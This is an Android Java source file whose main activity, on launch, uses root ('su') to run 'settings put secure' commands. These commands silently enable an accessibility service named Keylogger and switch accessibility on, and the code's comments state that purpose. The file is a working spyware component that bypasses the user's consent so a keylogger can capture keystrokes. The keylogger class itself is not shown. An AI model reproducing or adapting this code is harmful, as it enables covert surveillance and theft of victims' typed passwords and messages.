package com.example.dynamicapk;

import android.os.AsyncTask;
import android.os.Looper;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    // AsyncTask to run background task for enabling accessibility service
    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // Call method to enable accessibility service
            enableAccessibility();
            return null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("MainActivity", "onCreate");

        // Start the background task to enable accessibility service
        (new Startup()).execute();
    }

    // Method to enable accessibility service programmatically
    void enableAccessibility() {
        Log.d("MainActivity", "enableAccessibility");

        // Check if running on the main thread
        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.d("MainActivity", "on main thread");
        } else {
            Log.d("MainActivity", "not on main thread");

            // Run the command to enable the accessibility service
            try {
                // Execute command to enable accessibility services for the keylogger
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services com.example.dynamicapk/com.example.dynamicapk.Keylogger\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();

                // Wait for the process to complete
                process.waitFor();
            } catch (Exception e) {
                Log.e("MainActivity", "Error enabling accessibility", e);
                e.printStackTrace();
            }
        }
    }
}
